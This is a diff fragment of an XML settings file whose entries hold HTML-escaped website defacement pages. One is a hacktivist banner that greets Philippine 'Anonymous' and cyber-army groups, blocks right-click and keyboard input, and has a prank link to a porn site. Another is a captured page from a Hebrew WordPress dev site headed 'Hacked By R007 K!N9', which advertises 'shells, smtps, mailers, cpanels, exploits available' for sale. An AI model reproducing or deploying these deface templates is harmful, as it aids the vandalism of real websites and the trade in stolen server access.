+      &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;V3NDETTA&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;K4SH1&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;KIDO&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;SUPREMO&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;PH.ANG3&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;PH.LEGACY&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;PHU.NEUCHI&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt;&lt;br&gt;
+      &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;KHAIZ&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;CDX.KAZ&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;RxSonata&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;AKATZ&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;PH.ZENO&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;MR.D347H&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;Vlaphemous&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt; &lt;font color="red" size="5"&gt;MR.SULINUX&lt;/font&gt; &lt;font color="white"&gt;|&lt;/font&gt;&lt;br&gt;&lt;/b&gt;
+      &lt;hr size="3" width="fixed" color="#424242" align="center"&gt;
+      &lt;b&gt;&lt;font size="6" face="Iceland" color="white"&gt;Respected Cyber Groups! :&lt;/font&gt; &lt;font&gt;&lt;marquee title="NCA" behavior="scroll" direction="left" scrollamount="100" scrolldelay="400" width="80%"&gt;&lt;font color="red" face="Iceland" size="6"&gt;Greetings : ANONYMOUS PHILIPPINES / PHILIPPINE CYBER ARMY / PRIVATE-X / STRAWHAT-CREW HACKERS / C0D3X CYBER ARMY / PINOY VENDETTA / ANON.OCCUPY PHILIPPINES / PHANTOM HACKERS.PH / BLOODSECURITY INTERNATIONAL / PHILIPPINE HACKING UNIVERSITY / MAGDALO CYBER ARMY / ANONYWOLVES PHILIPPINES / PHU AND MCA DDOS SQUAD / HACKTIVIST PHILIPPINES / ANONYMOUS NAVOTAS / ANONYMOUS MALABON / ANONYMOUS VALENZUELA / ANONYMOUS CALOOCAN / ANONYMOUS TONDO / ANONYMOUS ANTIPOLO / RIZAL VENDETTA / ANONYMOUS LAGUNA / ANONYMOUS MUNTILUPA / ANONYMOUS CEBU / ANONYMOUS DAVAO / ANONYMOUS CAVITE / ANONYMOUS BATANGAS / ANONYMOUS PALAWAN / ANONYMOUS BULACAN / ANONYMOUS QUEZON CITY / ANONYMOUS TAGUIG / ANONYMOUS CAGAYAN DE ORO / ANONYMOUS ISABELA / ANONYMOUS TARLAC / ANONYMOUS PANGASINAN / ANONYMOUS SARANGANI / ANONYMOUS MARINQUDUE / ANONYMOUS BOHOL / ANONYMOUS PAMPANGA / ANONYMOUS ZAMBALES / ANONYMOUS LAS PINAS / ANONYMOUS LUCENA / ANONYMOUS ANTIQUE / ANONYMOUS LEYTE / ANONYMOUS SAMAR / ANONYMOUS CAGAYAN / ANONYMOUS BAGIUO / ANONYMOUS ZAMBOANGA / ANONYMOUS MONUMENTO / ANONYMOUS BUTUAN / PH CYBER ALLIANCE / DEFACER-PH / NEWBIEZ CYBER ALLIANCE / PH CYBER ALLIANCE / X-RADIANT CYBER ARMY / SKIDSEC PHILIPPINES =&amp;gt; and all Pilipino Hacktivist and Hackers&lt;/font&gt;&lt;/marquee&gt;&lt;/font&gt;&lt;/b&gt;
+      &lt;hr size="3" width="fixed" color="#424242" align="center"&gt;
+      &lt;center&gt;
+        &lt;center&gt;
+          &lt;b&gt;&lt;input align="left" type="button" onclick="location.href='https://www.facebook.com/NewbiezCyberAlliance';" value="Contact?" style="font-size:1em;background:red" a=""&gt;&lt;input type="button" onclick="location.href='https://www.pornhub.com' ;" value="Trace me?" style="font-size:1em;background:red"&gt;&lt;/b&gt;
+          &lt;style&gt;
+
+
+          body
+               {
+
+               background-image: url("https://i.pinimg.com/originals/1c/53/c0/1c53c04e87c537be2c301da684b9095c.gif");
+               background-color: rgb(0, 0, 0);
+               background-repeat: no-repeat;
+               background-attachment: fixed;
+               background-size: cover;
+               background-position: center center;
+               font-family: Iceland, sans-serif;
+               
+               }
+          &lt;/style&gt;
+             &lt;body bgcolor="black" text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play();fs()" id="body" onload="typeWriter()"&gt;
+        &lt;/center&gt;
+      &lt;/center&gt;
+    &lt;/center&gt;
+  &lt;/div&gt;
+&lt;/center&gt;</Value>
+    </Setting>
+    <Setting Name="Index5" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!DOCTYPE html&gt;
+&lt;html dir="rtl" lang="he-IL" class="no-js"&gt;
+&lt;head&gt;
+    &lt;title&gt;
+          HACKED BY R007 K!N9    &lt;/title&gt;
+    &lt;meta charset="UTF-8"&gt;
+	&lt;meta name="viewport" content="width=device-width, initial-scale=1.0" &gt;
+
+    &lt;link rel="icon" href="/favicon.png" type="image/gif" sizes="16x16"&gt;
+    
+	&lt;link rel="profile" href="https://gmpg.org/xfn/11"&gt;
+
+	&lt;meta name='robots' content='noindex, nofollow' /&gt;
+&lt;link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com' /&gt;
+&lt;link rel="alternate" type="application/rss+xml" title="My Blog &amp;laquo; פיד תגובות של HACKED BY R007 K!N9" href="https://builder.dev.site-pro.co.il/hacked-by-r007-kn9/feed/" /&gt;
+&lt;script type="text/javascript"&gt;
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/builder.dev.site-pro.co.il\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.2"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&amp;&amp;i.getContext("2d");function s(e,t){p.clearRect(0,0,i.width,i.height),p.fillText(e,0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(t,0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r&lt;o.length;r++)t.supports[o[r]]=function(e){if(p&amp;&amp;p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s("\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!s("\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&amp;&amp;!s("\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!s("\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff","\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")}return!1}(o[r]),t.supports.everything=t.supports.everything&amp;&amp;t.supports[o[r]],"flag"!==o[r]&amp;&amp;(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&amp;&amp;t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&amp;&amp;!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&amp;&amp;t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&amp;&amp;e.twemoji&amp;&amp;(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
+&lt;/script&gt;
+&lt;style type="text/css"&gt;
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+&lt;/style&gt;
+	&lt;link rel='stylesheet' id='sweetalert2-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/user-registration/assets/css/sweetalert2/sweetalert2.min.css?ver=8.17.1' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='user-registration-general-rtl-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/user-registration/assets/css/user-registration-rtl.css?ver=1.9.4.1' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='user-registration-smallscreen-rtl-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/user-registration/assets/css/user-registration-smallscreen-rtl.css?ver=1.9.4.1' type='text/css' media='only screen and (max-width: 768px)' /&gt;
+&lt;link rel='stylesheet' id='user-registration-my-account-layout-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/user-registration/assets/css/my-account-layout.css?ver=1.9.4.1' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='dashicons-css' href='https://builder.dev.site-pro.co.il/wp-includes/css/dashicons.min.css?ver=6.2' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='wp-block-library-rtl-css' href='https://builder.dev.site-pro.co.il/wp-includes/css/dist/block-library/style-rtl.min.css?ver=6.2' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='wc-block-vendors-style-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/vendors-style.css?ver=4.7.2' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='wc-block-style-rtl-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/style-rtl.css?ver=4.7.2' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='classic-theme-styles-css' href='https://builder.dev.site-pro.co.il/wp-includes/css/classic-themes.min.css?ver=6.2' type='text/css' media='all' /&gt;
+&lt;style id='global-styles-inline-css' type='text/css'&gt;
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow &gt; .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow &gt; .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow &gt; .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained &gt; .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained &gt; .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained &gt; .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained &gt; :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained &gt; .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex &gt; *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+&lt;/style&gt;
+&lt;link rel='stylesheet' id='contact-form-7-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.3.2' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='contact-form-7-rtl-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/contact-form-7/includes/css/styles-rtl.css?ver=5.3.2' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='fontawsome-css' href='//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css?ver=1.0.5' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='sogo_accessibility-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/sogo-accessibility/public/css/sogo-accessibility-public.css?ver=1.0.5' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='woocommerce-layout-rtl-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/assets/css/woocommerce-layout-rtl.css?ver=5.2.5' type='text/css' media='all' /&gt;
+&lt;link rel='stylesheet' id='woocommerce-smallscreen-rtl-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/assets/css/woocommerce-smallscreen-rtl.css?ver=5.2.5' type='text/css' media='only screen and (max-width: 768px)' /&gt;
+&lt;link rel='stylesheet' id='woocommerce-general-rtl-css' href='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/assets/css/woocommerce-rtl.css?ver=5.2.5' type='text/css' media='all' /&gt;
+&lt;style id='woocommerce-inline-inline-css' type='text/css'&gt;
+.woocommerce form .form-row .required { visibility: visible; }
+&lt;/style&gt;
+&lt;link rel='stylesheet' id='style-css' href='https://builder.dev.site-pro.co.il/wp-content/themes/sitepro/style.css?ver=6.2' type='text/css' media='all' /&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-includes/js/jquery/jquery.min.js?ver=3.6.3' id='jquery-core-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.0' id='jquery-migrate-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/themes/sitepro/nicEdit.js?ver=6.2' id='nicEdit-js'&gt;&lt;/script&gt;
+&lt;link rel="https://api.w.org/" href="https://builder.dev.site-pro.co.il/wp-json/" /&gt;&lt;link rel="alternate" type="application/json" href="https://builder.dev.site-pro.co.il/wp-json/wp/v2/posts/100811" /&gt;&lt;link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://builder.dev.site-pro.co.il/xmlrpc.php?rsd" /&gt;
+&lt;link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://builder.dev.site-pro.co.il/wp-includes/wlwmanifest.xml" /&gt;
+&lt;meta name="generator" content="WordPress 6.2" /&gt;
+&lt;meta name="generator" content="WooCommerce 5.2.5" /&gt;
+&lt;link rel="canonical" href="https://builder.dev.site-pro.co.il/hacked-by-r007-kn9/" /&gt;
+&lt;link rel='shortlink' href='https://builder.dev.site-pro.co.il/?p=100811' /&gt;
+&lt;link rel="alternate" type="application/json+oembed" href="https://builder.dev.site-pro.co.il/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fbuilder.dev.site-pro.co.il%2Fhacked-by-r007-kn9%2F" /&gt;
+&lt;link rel="alternate" type="text/xml+oembed" href="https://builder.dev.site-pro.co.il/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fbuilder.dev.site-pro.co.il%2Fhacked-by-r007-kn9%2F&amp;#038;format=xml" /&gt;
+	&lt;noscript&gt;&lt;style&gt;.woocommerce-product-gallery{ opacity: 1 !important; }&lt;/style&gt;&lt;/noscript&gt;
+		&lt;link rel="stylesheet" href="/wp-content/themes/sitepro/font-awesome/css/font-awesome.min.css"&gt;
+	
+	
+	
+	&lt;link rel="preconnect" href="https://fonts.gstatic.com"&gt;
+    &lt;link href="https://fonts.googleapis.com/css2?family=Assistant:wght@200;300;400;500;600;800&amp;display=swap" rel="stylesheet"&gt;
+	
+	&lt;script&gt;(function(e,t,n){var r=e.querySelectorAll("html")[0];r.className=r.className.replace(/(^|\s)no-js(\s|$)/,"$1js$2")})(document,window,0);&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;header&gt;
+        
+        &lt;a class="logo" href="/"&gt;&lt;img src="/wp-content/uploads/2021/02/logo.png" &gt;&lt;/a&gt;
+        &lt;div class="header-left"&gt;
+            &lt;a class="header-button" href="/my-account/"&gt;התחבר&lt;/a&gt;            
+          
+            &lt;a href='/%D7%91%D7%97%D7%99%D7%A8%D7%AA-%D7%AA%D7%91%D7%A0%D7%99%D7%AA/' class='header-button header-create-button'&gt;צור כרטיס&lt;/a&gt;            
+        &lt;/div&gt;
+        
+     
+
+&lt;script&gt;
+function myFunction() {
+  document.getElementById("myDropdown").classList.toggle("show");
+}
+window.onclick = function(event) {
+  if (!event.target.matches('.dropbtn')) {
+    var dropdowns = document.getElementsByClassName("dropdown-content");
+    var i;
+    for (i = 0; i &lt; dropdowns.length; i++) {
+      var openDropdown = dropdowns[i];
+      if (openDropdown.classList.contains('show')) {
+        openDropdown.classList.remove('show');
+      }
+    }
+  }
+}
+&lt;/script&gt;
+
+	&lt;/header&gt;
+
+&lt;section class="main-section"&gt;
+&lt;section class="page"&gt;
+    
+&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Hacked By R007 K!N9 &amp;#8211; Team Anon Force&lt;/title&gt;&lt;meta charset="UTF-8"/&gt;&lt;meta name="author" content="R007 K!N9"/&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"/&gt;&lt;meta name="description" content="shells , smtps , mailers , cpanels , exploits available"/&gt;&lt;meta property="og:title" content="Hacked By R007 K!N9 - Team Anon Force"/&gt;&lt;meta name="keywords" content="R007 K!N9 - Team Anon Force,Hacked By R007 K!N9,hacked by R007 K!N9,haxor uploader, haxor script deface generator, nathan prinsley, mr.prins, prinsh, hacked by, haxor my id"/&gt;&lt;meta property="og:image" content="https://cdn.prinsh.com/data-1/images/NathanPrinsley-sad-girls-ae.jpg"/&gt;&lt;meta property="og:type" content="website"/&gt; &lt;meta property="og:site_name" content="Haxor Uploader"/&gt;&lt;link rel="shortcut icon" type="image/x-icon" href="https://cdn.prinsh.com/data-1/images/NathanPrinsley-sad-girls-ae.jpg" /&gt;&lt;link rel="stylesheet" type="text/css" href="https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css"/&gt;&lt;style&gt;body{background: black;font-family:Times New Roman;margin-top:35px;}h1,h2{margin-top:.3em;margin-bottom:.3em;}h1.nprinsleyy{color:#dbd9d9;}h2{color:#dbd9d9;}p.message_prinsley{color:#dbd9d9;margin-top:.25em;margin-bottom:.25em;font-size:17px;font-weight:unset;}.hubungi_prinsh{color:#00eb00;text-decoration:none;}.hubungi_prinsh:hover{color:red}.othermes_nprinsh{color:#00eb00;font-size:14px;}marquee.foonathanPrinsley{display:;position: fixed; width: 100%; bottom: 0px; font-family: Tahoma; height: 20px; color: white; left: 0px; border-top: 2px solid darkred; padding: 5px; background-color: #000}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;center/&gt;&lt;img decoding="async" src="https://cdn.prinsh.com/data-1/images/NathanPrinsley-sad-girls-ae.jpg" style="width: 20%"&gt;&lt;h1 class="nprinsleyy nprinsley-text-glitchan" style="font-size:30px;"&gt;Hacked By R007 K!N9&lt;/h1&gt;&lt;h2 style="font-size:30px;" class="nprinsley-text-glitchan"&gt;Team Anon Force&lt;/h2&gt;&lt;p class="message_prinsley nprinsley-text-glitchan"&gt;shells , smtps , mailers , cpanels , exploits available&lt;/p&gt;&lt;p style="font-size:17px;" class="nathan-prinsley_none"&gt;&lt;a class="hubungi_prinsh" href="mailto:teamanonforce@gmail.com"&gt;teamanonforce@gmail.com&lt;/a&gt;&lt;/p&gt;&lt;p class="othermes_nprinsh nathan-prinsley_none"&gt;Telegram:Team Anon Force&lt;/p&gt;&lt;audio src="https://cdn.prinsh.com/data-1/mp3/"  autoplay="1" loop="1"&gt;&lt;/audio&gt;&lt;marquee class="foonathanPrinsley"&gt;&lt;b style="color: #edc800;font-size:16px;" class="nathan-prinsley_none"&gt;Gretings: Mr Unknown6T9 ; Professor6T9 ; And all Hackers &amp;#038; Defacers&lt;/b&gt;&lt;/marquee&gt;&lt;/center&gt;&lt;script src="https://cdn.prinsh.com/NathanPrinsley-effect/salju-terbang.js" type="text/javascript"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
+
+
+
+
+
+
+
+
+
+
+                                                                    Hacked By R007 K!N9
+&lt;/section&gt;
+&lt;/section&gt;
+
+
+
+	&lt;footer&gt; 
